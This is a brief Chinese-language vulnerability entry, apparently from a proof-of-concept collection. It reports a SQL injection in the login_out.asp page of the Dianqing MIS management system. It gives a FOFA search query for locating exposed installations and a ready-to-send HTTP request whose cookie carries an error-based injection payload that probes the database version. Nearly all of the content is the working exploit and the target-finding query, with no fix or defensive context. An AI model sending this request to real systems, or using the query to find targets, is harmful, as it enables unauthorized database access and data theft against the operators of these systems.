## 点晴MIS管理信息系统login_out.asp存在SQL注入

## fofa
```
title="点晴MIS管理信息系统"
```

## poc
```
GET /login_out.asp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Cookie: oabusyusername=1'+and+@@VERSION>1--
```
